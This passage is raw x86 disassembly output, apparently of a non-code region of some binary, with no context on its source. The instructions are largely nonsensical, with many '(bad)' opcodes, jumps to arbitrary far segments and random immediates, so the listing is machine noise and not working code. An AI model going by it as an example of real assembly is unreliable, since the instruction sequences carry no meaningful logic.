  42343a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42343b:	je     0x4234a0
  42343d:	cdq    
  42343e:	ins    BYTE PTR es:[edi],dx
  42343f:	lods   al,BYTE PTR ds:[esi]
  423440:	mov    bh,ch
  423442:	add    BYTE PTR [eax],al
  423444:	imul   ebx,DWORD PTR [esi],0xa272d3b1
  42344a:	xor    BYTE PTR [ebx+0x354eeaee],ch
  423450:	mov    esi,0x3944
  423455:	mov    es,esp
  423457:	add    BYTE PTR ss:[eax],al
  42345a:	xor    al,0x73
  42345c:	sub    BYTE PTR [edx-0x17],ah
  42345f:	(bad)  
  423460:	aad    0x40
  423462:	aas    
  423463:	add    BYTE PTR [eax],al
  423465:	mov    bl,0x1a
  423467:	inc    edi
  423468:	mov    bl,0xe
  42346a:	sbb    eax,0xc588
  42346f:	adc    BYTE PTR [ecx+0x121466e8],dh
  423475:	loopne 0x423484
  423477:	js     0x42346a
  423479:	mov    BYTE PTR [edx-0x4cf40000],ch
  42347f:	add    BYTE PTR [eax],al
  423481:	fisub  DWORD PTR [ebx-0x77]
  423484:	mov    esi,0x6abbf843
  423489:	outs   dx,BYTE PTR ds:[esi]
  42348a:	pop    ebx
  42348b:	and    al,dl
  42348d:	or     DWORD PTR [ebx-0x65b05624],0x69
  423494:	imul   esp,DWORD PTR [eax],0xffffff8c
  423497:	out    0x0,al
  423499:	add    BYTE PTR [ebx+eiz*8],ch
  42349c:	daa    
  42349d:	jg     0x4234b1
  42349f:	add    BYTE PTR [ecx],0x0
  4234a2:	add    BYTE PTR [eax+0x64],cl
  4234a5:	add    BYTE PTR [eax],al
  4234a7:	int    0x3e
  4234a9:	cmp    edi,DWORD PTR [edx+0x6c]
  4234ac:	outs   dx,BYTE PTR ds:[esi]
  4234ad:	push   0xffffffed
  4234af:	fs or  edi,edi
  4234b2:	fwait
  4234b3:	mov    DWORD PTR [ebp+0x57],ebp
  4234b6:	pop    esi
  4234b7:	mov    ecx,0x7cf21773
  4234bc:	xlat   BYTE PTR ds:[ebx]
  4234bd:	xchg   edi,eax
  4234be:	scas   al,BYTE PTR es:[edi]
  4234bf:	push   eax
  4234c0:	jle    0x4234d8
  4234c2:	jge    0x4234cc
  4234c4:	mov    dl,0x0
  4234c6:	add    BYTE PTR [eax],dh
  4234c8:	jge    0x423545
  4234ca:	test   esp,esp
  4234cc:	and    eax,0x51bddb32
  4234d1:	cmp    dh,BYTE PTR ds:0x58c
  4234d7:	(bad)  
  4234d9:	xchg   ecx,eax
  4234db:	scas   al,BYTE PTR es:[edi]
  4234dc:	sbb    al,0xdf
  4234de:	adc    eax,0x777e6652
  4234e3:	mov    eax,0x2a5e22ed
  4234e8:	or     bl,BYTE PTR [eax-0x1a]
  4234eb:	pop    esi
  4234ec:	add    eax,0x7e63a7f1
  4234f1:	pop    esp
  4234f2:	outs   dx,BYTE PTR ds:[esi]
  4234f3:	addr16 loop 0x423503
  4234f6:	dec    ecx
  4234f7:	fist   WORD PTR [edi]
  4234f9:	or     ah,BYTE PTR [edx+esi*2-0x7e]
  4234fd:	in     eax,0x24
  4234ff:	dec    ebp
  423500:	ins    DWORD PTR es:[edi],dx
  423501:	dec    ebx
  423502:	push   ecx
  423503:	ja     0x4234fa
  423505:	pusha  
  423506:	shl    BYTE PTR [esi],1
  423508:	xor    BYTE PTR [edx],ah
  42350a:	out    0xe7,eax
  42350c:	mov    BYTE PTR [eax+0x0],ah
  42350f:	add    al,bl
  423511:	scas   al,BYTE PTR es:[edi]
  423512:	lods   eax,DWORD PTR ds:[esi]
  423513:	enter  0x78,0x0
  423517:	adc    BYTE PTR [edx-0x5e],dh
  42351a:	mov    cl,0x6b
  42351c:	inc    esp
  42351d:	xchg   esi,eax
  42351e:	add    BYTE PTR [eax],al
  423520:	js     0x42355c
  423522:	les    ebp,FWORD PTR [edx-0x17d70000]
  423528:	mov    ecx,eax
  42352a:	push   edi
  42352b:	add    BYTE PTR [eax],al
  42352d:	repz inc ecx
  42352f:	dec    esi
  423530:	les    esp,FWORD PTR [ebp+0x7e8a0000]
  423536:	loop   0x4234dc
  423538:	daa    
  423539:	cmp    eax,0xbc92e67d
  42353e:	xor    ebp,DWORD PTR [edx+0x7f339c2a]
  423544:	jmp    0x4235a2
  423546:	jbe    0x42358b
  423548:	cmp    edx,DWORD PTR [ebp+0x49c51acb]
  42354e:	lahf   
  42354f:	pop    ebp
  423550:	inc    ebx
  423551:	retf   0xe5fe
  423554:	fs pop ebx
  423556:	popa   
  423557:	mov    ah,BYTE PTR [edx]
  423559:	lock lock aaa 
  42355c:	das    
  42355d:	push   ecx
  42355e:	out    0x29,al
  423560:	jp     0x423560
  423562:	test   BYTE PTR [edi],0x3f
  423565:	pop    ss
  423566:	xchg   esi,eax
  423567:	adc    bh,BYTE PTR [esi+0x6a59d269]
  42356d:	or     eax,0xe3a5fb03
  423572:	in     al,0x43
  423574:	push   eax
  423575:	fs in  al,dx
  423577:	and    eax,0x9940
  42357c:	pop    edi
  42357d:	fsubr  QWORD PTR [eax]
  42357f:	enter  0x65,0x0
  423583:	adc    BYTE PTR [ecx-0x21],ah
  423586:	rcr    BYTE PTR [edx],1
  423588:	outs   dx,DWORD PTR ds:[esi]
  423589:	add    eax,0x9e00edee
  42358e:	add    BYTE PTR [eax],al
  423590:	add    DWORD PTR [esi+0x26],ecx
  423593:	push   esi
  423594:	xchg   ebp,eax
  423595:	push   esp
  423596:	add    al,al
  423598:	xchg   ecx,eax
  423599:	add    BYTE PTR [eax],al
  42359b:	loopne 0x42357d
  42359d:	mov    WORD PTR [eax+eax*1+0x0],?
  4235a1:	mov    esi,0x22cbd3dc
  4235a6:	aas    
  4235a7:	push   edx
  4235a8:	ss fwait
  4235aa:	test   eax,0x9ef6382d
  4235af:	mov    edx,0x2d270e41
  4235b4:	sbb    eax,0x218c
  4235b9:	adc    al,dh
  4235bb:	xchg   edi,ecx
  4235bd:	stos   BYTE PTR es:[edi],al
  4235be:	cld    
  4235bf:	jle    0x423589
  4235c1:	std    
  4235c2:	add    BYTE PTR [eax],al
  4235c4:	cmp    BYTE PTR ds:[esi-0xcdb85f],0x9c
  4235cc:	aad    0x45
  4235ce:	into   
  4235cf:	cwde   
  4235d0:	test   eax,0x48cca73c
  4235d5:	add    BYTE PTR [eax],al
  4235d7:	xor    esp,0x4dc3d525
  4235dd:	mov    bl,0xc1
  4235df:	(bad)  
  4235e0:	int    0xec
  4235e2:	xchg   ebp,eax
  4235e3:	mov    BYTE PTR [edi+0x0],cl
  4235e6:	add    BYTE PTR [eax],cl
  4235e8:	inc    edi
  4235e9:	add    BYTE PTR [eax],al
  4235eb:	jns    0x4235d9
  4235ed:	in     al,dx
  4235ee:	clc    
  4235ef:	push   ds
  4235f0:	test   eax,0x558ce2
  4235f5:	add    BYTE PTR [esi+0x7ec21c3f],cl
  4235fb:	mov    eax,0x838ab5a5
  423600:	sbb    cl,ch
  423602:	jmp    0xd7e7:0xb9bcc5f1
  423609:	mov    bl,BYTE PTR [ebx-0xbfb0630]
  42360f:	add    BYTE PTR [eax],al
  423611:	das    
  423612:	or     eax,ecx
  423614:	push   0xffffff8b
  423616:	dec    eax
  423617:	jmp    0x316:0x87e80000
  42361e:	jge    0x42366d
  423620:	outs   dx,BYTE PTR ds:[esi]
  423621:	lods   al,BYTE PTR ds:[esi]
  423622:	dec    edx
  423623:	push   edx
  423624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423625:	retf   0xad53
  423628:	in     eax,0x8c
  42362a:	adc    eax,0xe0f40000
  42362f:	out    dx,eax
  423630:	mov    ds:0xf0405243,eax
  423635:	add    BYTE PTR [eax],al
  423637:	push   edi
  423638:	or     dh,bl
  42363a:	add    BYTE PTR [eax],al
  42363c:	jmp    0x1e96:0x43185693
  423643:	inc    ax
  423645:	or     al,0x0
  423647:	add    BYTE PTR [ebx+0x7d],dh
  42364a:	ss loop 0x42360d
  42364d:	cmp    al,BYTE PTR [eax]
  42364f:	add    bh,bh
  423651:	jns    0x423627
  423653:	adc    bh,BYTE PTR [ebx]
  423655:	leave  
  423656:	daa    
  423657:	sub    DWORD PTR [eax+0xd],eax
  42365a:	add    BYTE PTR [eax],al
  42365c:	scas   eax,DWORD PTR es:[edi]
  42365d:	das    
  42365e:	sahf   
  42365f:	nop
  423660:	test   DWORD PTR [ebp+0x5367f46d],edx
  423666:	xchg   BYTE PTR [edi+edi*2+0xa540b5],dh
  42366d:	add    al,ch
  42366f:	cs repz cmc 
  423672:	mov    cl,0x18
  423674:	outs   dx,BYTE PTR ds:[esi]
  423675:	fiadd  DWORD PTR [edx+0x45a2c557]
  42367b:	cmp    BYTE PTR [edx+0x67],ch
  42367e:	sub    cl,BYTE PTR [ebx-0x7181758e]
  423684:	retf   
  423685:	lds    esp,FWORD PTR [ecx+0x71]
  423688:	or     ebx,DWORD PTR [edi+esi*2]
  42368b:	pop    ebx
  42368c:	mov    BYTE PTR [eax+eax*1],ch
  42368f:	add    ah,al
  423691:	mov    dh,0x0
  423693:	add    BYTE PTR [ecx+edi*8+0x41],ah
  423697:	sbb    al,0x8
  42369a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42369b:	add    BYTE PTR [eax],al
  42369d:	add    eax,0x8e7efc24
  4236a2:	mov    ds:0xbc48b893,eax
  4236a7:	add    BYTE PTR [eax],al
  4236a9:	pop    ebx
  4236aa:	je     0x4236c1
  4236ac:	fld    st(2)
  4236ae:	test   al,0x6f
  4236b0:	add    DWORD PTR ds:0xe21d4572,ecx
  4236b6:	daa    
  4236b7:	mov    dh,0x37
  4236b9:	mov    esp,DWORD PTR [esi+0x79]
  4236bc:	pop    ecx
  4236bd:	mov    eax,esp
  4236bf:	pop    ebp
  4236c0:	add    BYTE PTR [eax],al
  4236c2:	je     0x42371e
  4236c4:	sbb    DWORD PTR [ecx+0x24],ecx
  4236c7:	stc    
  4236c8:	(bad)  
  4236c9:	nop
  4236ca:	imul   edx,DWORD PTR [ecx+0xd5e0994],0xffffffda
  4236d1:	(bad)  [edx+0xf0c0]
  4236d7:	inc    esp
  4236d8:	test   BYTE PTR [eax],al
  4236da:	add    BYTE PTR [edx+0x3c095742],cl
  4236e0:	cmp    al,0x58
  4236e2:	sub    edi,DWORD PTR [edx-0x5e]
  4236e5:	mov    eax,0x5af7db87
  4236ea:	sub    BYTE PTR [ecx],0x0
  4236ed:	add    BYTE PTR [eax+0x7f40dd],dh
  4236f3:	add    BYTE PTR [ebp+0x65577e5e],ch
  4236f9:	add    eax,0x27099efe
  4236fe:	std    
  4236ff:	div    DWORD PTR [eax+0x194811a0]
  423705:	add    BYTE PTR [eax],al
  423707:	paddusw mm7,QWORD PTR [esi]
  42370a:	mov    WORD PTR [ebp+0x33cf0000],es
  423710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423711:	push   ebp
  423712:	iret   
  423713:	lea    edi,[ecx+0x7b0069]
  423719:	add    BYTE PTR [esi],bl
  42371b:	adc    eax,0x198c196
  423720:	mov    edx,DWORD PTR [esi+0x3d]
  423723:	sub    BYTE PTR [esi],ch
  423725:	ins    BYTE PTR es:[edi],dx
  423726:	pushf  
  423727:	adc    al,0x35
  423729:	cmc    
  42372a:	test   eax,0xa3c0fe
  42372f:	add    bl,bl
  423731:	mov    bh,0x57
  423733:	sbb    eax,0x9b579bdf
  423738:	fsubr  DWORD PTR ds:0xbf08
  42373e:	data16 cmp al,0x10
  423741:	adc    BYTE PTR ds:0x633b7262,ah
  423747:	sbb    BYTE PTR [esi+0x57],dl
  42374a:	cli    
  42374b:	loopne 0x4237bf
  42374d:	nop
  42374e:	cs jmp 0x423701
  423751:	xchg   esi,eax
  423752:	call   0x24586dcd
  423757:	inc    esi
  423758:	xchg   ebx,eax
  423759:	push   esp
  42375a:	fdiv   QWORD PTR [ebx]
  42375c:	sub    ch,BYTE PTR [ebp-0x8]
  42375f:	cmp    eax,0xcb7ce499
  423764:	into   
  423765:	gs xchg ecx,eax
  423767:	dec    esp
  423768:	sub    eax,DWORD PTR [eax]
  42376a:	add    BYTE PTR ds:0xff65324b,bh
  423770:	mov    esp,0xf43a7b94
  423775:	sub    eax,0xd82452a3
  42377a:	(bad)  
  42377b:	jno    0x4237b3
  42377d:	enter  0xc,0x0
  423781:	jb     0x423766
  423783:	call   0x3e9dee3f
  423788:	xor    DWORD PTR [edi-0x56],esi
  42378b:	jmp    0x2349:0x13b726ad
  423792:	(bad)  
  423793:	fldenv [ecx-0x22]
  423796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423797:	dec    edi
  423798:	jae    0x423819
  42379a:	into   
  42379b:	adc    al,ch
  42379d:	add    eax,0x187237a2
  4237a2:	loope  0x423794
  4237a4:	pop    ds
  4237a5:	test   eax,0xbe04
  4237aa:	arpl   di,ax
  4237ac:	push   cs
  4237ad:	je     0x423739
  4237af:	stos   BYTE PTR es:[edi],al
  4237b0:	pushf  
  4237b1:	stc    
  4237b2:	retf   
  4237b3:	imul   ebx,DWORD PTR [ebp+0xd],0x79
  4237b7:	push   edx
  4237b8:	inc    esp
  4237b9:	mov    ah,0x0
  4237bb:	add    bl,bl
  4237bd:	fsub   DWORD PTR [edx+0x6984]
  4237c3:	in     eax,dx
  4237c4:	(bad)  
  4237c5:	lea    edi,[ebx]
  4237c7:	data16 (bad) 
  4237c9:	into   
  4237ca:	xchg   BYTE PTR [ecx+0x41],al
  4237cd:	xor    dh,BYTE PTR [ecx-0x63f4fd24]
  4237d3:	jge    0x423774
  4237d5:	cli    
  4237d6:	dec    edi
  4237d7:	ins    DWORD PTR es:[edi],dx
  4237d8:	cmp    ch,BYTE PTR [ebp-0x48]
  4237db:	loope  0x423848
  4237dd:	fiadd  WORD PTR [ebp+0x5a]
  4237e0:	idiv   DWORD PTR [ecx-0x7de66c33]
  4237e6:	pop    edi
  4237e7:	cmp    ch,BYTE PTR [ebx]
  4237e9:	into   
  4237ea:	add    DWORD PTR [esi+0x7800],esi
  4237f0:	test   BYTE PTR [ecx-0x77d40000],dl
  4237f6:	and    DWORD PTR [eax],eax
  4237f8:	add    BYTE PTR [ebx+0x18],bl
  4237fb:	pusha  
  4237fc:	mov    DWORD PTR [eax+0x2b],ebx
  4237ff:	jmp    0xf83c:0x4d9e5579
  423806:	iret   
  423807:	mov    edx,0x87eaa11c
  42380c:	sub    esp,ebx
  42380e:	xchg   DWORD PTR [eax-0x5f4b6254],edx
  423814:	stc    
  423815:	xor    DWORD PTR [ecx+0xe],ecx
  423818:	pop    ebx
  423819:	xchg   esi,eax
  42381a:	fisttp QWORD PTR ds:[edx]
  42381d:	xchg   ebp,eax
  42381e:	jle    0x4237a5
  423820:	or     DWORD PTR [esi],esi
  423822:	jns    0x42385e
  423824:	sub    eax,edi
  423826:	jne    0x42389e
  423828:	mov    ah,0x7
  42382a:	data16 cld 
  42382c:	pop    edx
  42382d:	jg     0x423877
  42382f:	test   eax,0x93570000
  423834:	loope  0x4237df
  423836:	hlt    
  423837:	sbb    ch,ah
  423839:	dec    edx
  42383a:	xchg   al,al
  42383c:	pop    ebp
  42383d:	add    BYTE PTR [eax],al
  42383f:	jo     0x423851
  423841:	jae    0x423819
  423843:	lea    ebx,[edx-0x61c23443]
  423849:	sbb    dh,ch
  42384b:	(bad)  [edx]
  42384d:	jecxz  0x4238b6
  42384f:	or     al,bl
  423851:	add    BYTE PTR [eax],al
  423853:	sbb    al,BYTE PTR [edi-0x54]
  423856:	mov    al,0x88
  423858:	in     eax,0x0
  42385a:	add    BYTE PTR [esi],dh
  42385c:	shl    DWORD PTR [edx],1
  42385e:	ffree  st(0)
  423860:	and    BYTE PTR [eax],al
  423862:	add    BYTE PTR [ecx],ah
  423864:	push   edi
  423865:	inc    ecx
  423866:	push   edx
  423867:	xor    dh,ch
  423869:	push   ebp
  42386a:	enter  0x53,0x0
  42386e:	cmp    DWORD PTR [ebp-0x25],edi
  423871:	aaa    
  423872:	push   ss
  423873:	call   0xa520:0x16ee9df8
  42387a:	xchg   BYTE PTR [edx],al
  42387c:	mov    edx,0xb18c462a
  423881:	add    BYTE PTR [eax],al
  423883:	push   eax
  423884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423885:	push   edi
  423886:	test   BYTE PTR [ebx],dh
  423888:	add    BYTE PTR [eax],al
  42388a:	jmp    FWORD PTR [edx-0x60951872]
  423890:	cdq    
  423891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423892:	cld    
  423893:	sbb    DWORD PTR [si-0x1490],esp
  423898:	push   eax
  423899:	inc    esi
  42389a:	ins    BYTE PTR es:[edi],dx
  42389b:	sbb    dl,ah
  42389d:	sbb    al,BYTE PTR gs:[eax+0x56]
  4238a1:	add    BYTE PTR [eax],al
  4238a3:	mov    cl,0xd3
  4238a5:	add    al,BYTE PTR [edx-0x1f561009]
  4238ab:	je     0x423895
  4238ad:	mov    eax,ds:0x916c55df
  4238b2:	pop    edx
  4238b3:	les    ebp,FWORD PTR [esi]
  4238b5:	add    BYTE PTR [eax],al
  4238b7:	into   
  4238b8:	jp     0x423860
  4238ba:	ss stc 
  4238bc:	fdiv   QWORD PTR [ebx]
  4238be:	jbe    0x423909
  4238c0:	es cmc 
  4238c2:	cdq    
  4238c3:	or     BYTE PTR es:[esi+0x0],0x0
  4238c8:	ja     0x42384c
  4238ca:	mov    ebp,0x5bcdb5b6
  4238cf:	cmp    al,0x2a
  4238d1:	and    DWORD PTR [ebx+ebp*2],ecx
  4238d4:	add    BYTE PTR [eax],al
  4238d6:	sub    bh,0x0
  4238d9:	add    BYTE PTR [ecx+0x7a],dl
  4238dc:	mov    al,ds:0x2c329972
  4238e1:	xlat   BYTE PTR ds:[ebx]
  4238e2:	shl    DWORD PTR [ebx+ecx*2-0x3b],0xb5
  4238e7:	(bad)  
  4238e8:	std    
  4238e9:	mov    edi,0x9a537fd5
  4238ee:	fadd   QWORD PTR [edx+esi*2+0x0]
  4238f2:	add    BYTE PTR [ecx],ah
  4238f4:	test   DWORD PTR [ecx],ebx
  4238f6:	dec    esi
  4238f7:	scas   al,BYTE PTR es:[edi]
  4238f8:	mov    ebx,0xa720836d
  4238fd:	mov    DWORD PTR [edi],esi
  4238ff:	fsubr  DWORD PTR [ecx]
  423901:	ret    0xdd84
  423904:	add    BYTE PTR [eax],al
  423906:	fld    QWORD PTR [edi+esi*1+0x35290000]
  42390d:	stos   BYTE PTR es:[edi],al
  42390e:	cmp    al,0x51
  423910:	mov    bl,0xac
  423912:	or     DWORD PTR [esp+ecx*8],edi
  423915:	mov    edi,0x9d600000
  42391a:	and    eax,0x7bf5da7d
  42391f:	jmp    0x72661ae1
  423924:	rcl    DWORD PTR [eax+0x6c],cl
  423927:	cs push sp
  42392a:	in     eax,dx
  42392b:	push   cs
  42392c:	mov    bh,BYTE PTR [edi+0x178ce7b5]
  423932:	add    BYTE PTR [eax],al
  423934:	les    esi,FWORD PTR [edi+0x267d0000]
  42393a:	in     al,dx
  42393b:	jge    0x42391e
  42393d:	imul   edi,DWORD PTR [edi],0x78d52645
  423943:	mov    fs,WORD PTR [edi+0x2d11c2d]
  423949:	sub    al,0xd8
  42394b:	imul   esp,DWORD PTR [esi+0x139fdb8e],0xe98c
  423955:	lds    esi,FWORD PTR ds:0xcba1fca6
  42395b:	dec    edx
  42395c:	ficom  WORD PTR [eax]
  42395e:	fld    st(6)
  423960:	fnstenv [edi+0x11]
  423963:	adc    edx,ebx
  423965:	fldcw  WORD PTR [ebx-0x77]
  423968:	xchg   ebx,eax
  423969:	inc    ebx
  42396a:	sbb    DWORD PTR [edx],ebx
  42396c:	sub    esi,eax
  42396e:	test   eax,0x44abcfa5
  423973:	or     eax,0xf5700000
  423978:	adc    ah,ah
  42397a:	add    bh,BYTE PTR [eax+0x7e40]
  423980:	adc    DWORD PTR [edi],edx
  423982:	fcomi  st,st(1)
  423984:	cmp    eax,0x7eaf544d
  423989:	ret    
  42398a:	adc    ch,BYTE PTR [edi]
  42398c:	mov    al,0x5c
  42398e:	inc    ebx
  42398f:	dec    esp
  423990:	enter  0x0,0xe0
  423994:	mov    cl,0xec
  423996:	pop    ecx
  423997:	repnz addr16 arpl ax,ax
  42399b:	adc    al,0x0
  42399d:	add    BYTE PTR [eax+0x2640503b],dl
  4239a3:	add    BYTE PTR [eax],al
  4239a5:	mov    ds:0xb24487,al
  4239aa:	add    BYTE PTR [edi+0x2d],bh
  4239ad:	xchg   esp,eax
  4239ae:	out    dx,eax
  4239af:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4239b1:	pop    eax
  4239b2:	and    BYTE PTR [esi+edi*1+0x0],al
  4239b6:	add    ah,dl
  4239b8:	loop   0x4239fc
  4239ba:	push   cs
  4239bb:	and    DWORD PTR [esi],0xffffff84
  4239be:	push   0x66aa0000
  4239c3:	push   ebp
  4239c4:	inc    edx
  4239c5:	push   edx
  4239c6:	jmp    0xc3e6f4d0
  4239cb:	inc    edx
  4239cc:	addr16 jno 0x4239d7
  4239cf:	and    eax,0xb7290000
  4239d4:	imul   ecx,DWORD PTR [eax-0x1e],0xb0b20000
  4239db:	mov    edi,0x8727fc92
  4239e0:	dec    esi
  4239e1:	xor    bl,dl
  4239e3:	cwde   
  4239e4:	int3   
  4239e5:	je     0x4239e7
  4239e7:	add    bh,dh
  4239e9:	std    
  4239ea:	push   0xd995771
  4239ef:	retf   0x8453
  4239f2:	rol    BYTE PTR [eax],cl
  4239f4:	add    bl,bl
  4239f6:	repnz (bad) 
  4239f8:	andps  xmm2,XMMWORD PTR [esi+0x7d]
  4239fc:	adc    cl,BYTE PTR [edi+0x19be4e59]
  423a02:	mov    ecx,0x20f2b918
  423a07:	mov    cl,0xe6
  423a09:	ins    DWORD PTR es:[edi],dx
  423a0a:	adc    eax,0x18857
  423a0f:	add    BYTE PTR [eax-0x2e3ea39d],dl
  423a15:	popf   
  423a16:	mov    esi,0x8de3418e
  423a1b:	lock cmp ch,bh
  423a1e:	pop    ss
  423a1f:	(bad)  
  423a20:	aad    0x9e
  423a22:	je     0x4239e1
  423a24:	add    BYTE PTR [esi],bl
  423a26:	add    BYTE PTR [eax],al
  423a28:	jecxz  0x423a6c
  423a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a2b:	inc    edx
  423a2c:	or     BYTE PTR [eax],ah
  423a2e:	add    BYTE PTR [eax],al
  423a30:	inc    edi
  423a31:	lods   al,BYTE PTR ds:[esi]
  423a32:	pop    edx
  423a33:	mov    eax,0x83689e73
  423a38:	and    DWORD PTR [esp+ebp*4-0x2b3b5b0f],edx
  423a3f:	add    BYTE PTR [eax],al
  423a41:	inc    ebp
  423a42:	mov    al,ds:0x4618a499
  423a47:	push   cs
  423a48:	xchg   ebx,eax
  423a49:	or     eax,DWORD PTR [edi+edx*8]
  423a4c:	add    BYTE PTR [eax],al
  423a4e:	lea    edx,ds:0x96e72c9c
  423a54:	test   BYTE PTR [ecx+0x0],dl
  423a57:	add    bl,bh
  423a59:	push   0xbca6db2
  423a5e:	inc    esi
  423a5f:	xor    BYTE PTR [edi-0x6d],bh
  423a62:	fadd   DWORD PTR [ebp-0x49]
  423a65:	push   0xffffffcd
  423a67:	pusha  
  423a68:	cmp    ecx,ebx
  423a6a:	call   0x2819:0xd5a05665
  423a71:	mov    ecx,0xd0ae23d2
  423a76:	xchg   bl,ah
  423a78:	mov    DWORD PTR [eax],0xfd0000bb
  423a7e:	and    BYTE PTR [edx-0x2f7aa03a],bh
  423a84:	test   al,0xb2
  423a86:	inc    esp
  423a87:	and    DWORD PTR [eax],eax
  423a89:	add    BYTE PTR [eax],al
  423a8b:	js     0x423a8d
  423a8d:	add    BYTE PTR [edx],cl
  423a8f:	sub    DWORD PTR [ebp+0x7ec4],edx
  423a95:	scas   al,BYTE PTR es:[edi]
  423a96:	mov    es,WORD PTR [ebx+0x7fd2ef85]
  423a9c:	aad    0xd8
  423a9e:	out    0x1c,eax
  423aa0:	test   eax,0x76065792
  423aa5:	jge    0x423a85
  423aa7:	adc    DWORD PTR [ecx+0x7529c25f],0xa
  423aae:	adc    edi,edx
  423ab0:	int    0x2e
  423ab2:	push   cs
  423ab3:	dec    eax
  423ab4:	xor    DWORD PTR [eax],eax
  423ab6:	add    BYTE PTR [ebp-0x4138db25],cl
  423abc:	lods   al,BYTE PTR ds:[esi]
  423abd:	fsubr  QWORD PTR [esi]
  423abf:	loop   0x423aeb
  423ac1:	call   0xd500:0x7c44e2
  423ac8:	in     al,dx
  423ac9:	int    0x9b
  423acb:	mov    eax,ds:0xed1bb9d0
  423ad0:	or     al,0x36
  423ad2:	add    BYTE PTR [eax],al
  423ad4:	mov    ecx,0x2a75c362
  423ad9:	xlat   BYTE PTR ds:[ebx]
  423ada:	push   es
  423adb:	or     al,0x3f
  423add:	add    BYTE PTR [eax],al
  423adf:	into   
  423ae0:	jl     0x423b55
  423ae2:	mov    bl,0x9e
  423ae4:	mov    eax,ds:0xed6da161
  423ae9:	enter  0xc9,0x0
  423aed:	sub    DWORD PTR [eax+0x3ec9bedc],edx
  423af3:	cmp    eax,0xd2c4
  423af8:	add    ecx,DWORD PTR [edx+ebp*8+0x0]
  423afc:	add    al,bl
  423afe:	push   esp
  423aff:	jnp    0x423acb
  423b01:	adc    eax,0x2a0ac3b4
  423b06:	js     0x423a9f
  423b08:	inc    esi
  423b09:	cmp    ebx,esi
  423b0b:	scas   eax,DWORD PTR es:[edi]
  423b0c:	sub    esp,0x62bc1755
  423b12:	adc    BYTE PTR [edx-0x6],al
  423b15:	loope  0x423b1e
  423b17:	and    DWORD PTR [esi+eax*2-0x76],ebx
  423b1b:	pushf  
  423b1c:	adc    edi,DWORD PTR [edx]
  423b1e:	push   esi
  423b1f:	and    edx,esp
  423b21:	xchg   ebx,eax
  423b22:	pop    esi
  423b23:	pop    ecx
  423b24:	addr16 aam 0xb1
  423b27:	dec    esi
  423b28:	jne    0x423b14
  423b2a:	lds    edx,FWORD PTR [esi-0xc]
  423b2d:	mov    edi,0x2059cb67
  423b32:	xchg   ebp,eax
  423b33:	ret    0xf5a2
  423b36:	gs mov bl,0x1d
  423b39:	jl     0x423ac5
  423b3b:	inc    ebx
  423b3c:	mov    edi,0xbe95bcd6
  423b41:	xlat   BYTE PTR ds:[ebx]
  423b42:	out    dx,al
  423b43:	in     eax,0x71
  423b45:	es mov ebp,0xddbf2083
  423b4b:	lock out dx,eax
  423b4d:	jb     0x423ae9
  423b4f:	xchg   ebp,eax
  423b50:	dec    esi
  423b51:	jnp    0x423b29
  423b53:	ret    
  423b54:	test   BYTE PTR ds:[edx+0x0],bh
  423b58:	add    bl,ah
  423b5a:	add    DWORD PTR [edx],edi
  423b5c:	jns    0x423ba0
  423b5e:	mov    dh,0xd3
  423b60:	dec    esi
  423b61:	mov    fs:0xd8b77343,eax
  423b67:	xor    eax,0xd8df85b2
  423b6c:	dec    ebp
  423b6d:	lea    eax,[eax+0x56]
  423b70:	add    BYTE PTR [eax],al
  423b72:	cmp    al,BYTE PTR [edi+0x75d1d6f9]
  423b78:	mov    esp,0x1aadc225
  423b7d:	sbb    al,dl
  423b7f:	retf   
  423b80:	mov    ecx,0x22dfdc72
  423b85:	and    eax,0x798965ff
  423b8a:	fnstcw WORD PTR [ebp-0x370c223]
  423b90:	int3   
  423b91:	xchg   esp,eax
  423b92:	add    BYTE PTR [eax],al
  423b94:	push   esp
  423b95:	(bad)  
  423b96:	push   cs
  423b97:	mov    ebp,db0
  423b9a:	cmp    dl,al
  423b9c:	add    ebp,ecx
  423b9e:	or     al,0x48
  423ba0:	add    BYTE PTR [eax],al
  423ba2:	ins    BYTE PTR es:[edi],dx
  423ba3:	pop    ecx
  423ba4:	mov    DWORD PTR [eax-0x5a],edx
  423ba7:	pop    edx
  423ba8:	(bad)  
  423baa:	pop    ebx
  423bab:	mov    BYTE PTR [eax+eax*1+0x0],ah
  423baf:	mov    ebx,0x4711fba1
  423bb4:	jmp    0xdb00:0x9f84f8
  423bbb:	in     al,dx
  423bbc:	in     al,dx
  423bbd:	outs   dx,DWORD PTR ds:[esi]
  423bbe:	stos   DWORD PTR es:[edi],eax
  423bbf:	add    BYTE PTR [edx+0x0],bl
  423bc2:	add    BYTE PTR [ebp+0x64b0c634],dh
  423bc8:	ins    BYTE PTR es:[edi],dx
  423bc9:	out    dx,eax
  423bca:	in     al,dx
  423bcb:	xchg   esi,eax
  423bcc:	jmp    0x423bfd
  423bce:	mov    DWORD PTR [edi+0x67c4],edx
  423bd4:	retf   
  423bd5:	fs (bad) 
  423bd8:	inc    esi
  423bd9:	pop    edi
  423bda:	mov    edx,0xcaa12fde
  423bdf:	mov    BYTE PTR [ebx+0x35930000],bh
  423be5:	sub    eax,0x598fcfa5
  423bea:	cmp    BYTE PTR [edx+0xb4ca93c],al
  423bf0:	add    BYTE PTR [eax],al
  423bf2:	cmp    al,0xae
  423bf4:	dec    edi
  423bf5:	mov    bl,0x5f
  423bf7:	jmp    0xb5:0xc0a6e121
  423bfe:	add    al,dl
  423c00:	fs and dl,bl
  423c03:	mov    esi,DWORD PTR [ebx-0x73]
  423c06:	and    al,0x71
  423c08:	cmp    al,0xfc
  423c0a:	retf   0x1313
  423c0d:	js     0x423c3f
  423c0f:	sbb    DWORD PTR [edi-0x16d36f12],0x9805435e
  423c19:	jecxz  0x423c23
  423c1b:	mov    eax,DWORD PTR [eax]
  423c1d:	add    BYTE PTR [eax+0x3e],al
  423c20:	add    BYTE PTR [eax],al
  423c22:	fld    DWORD PTR [edi+ecx*4+0x0]
  423c26:	add    BYTE PTR [esi+0x54089456],al
  423c2c:	add    BYTE PTR [eax],al
  423c2e:	push   ebx
  423c2f:	inc    edx
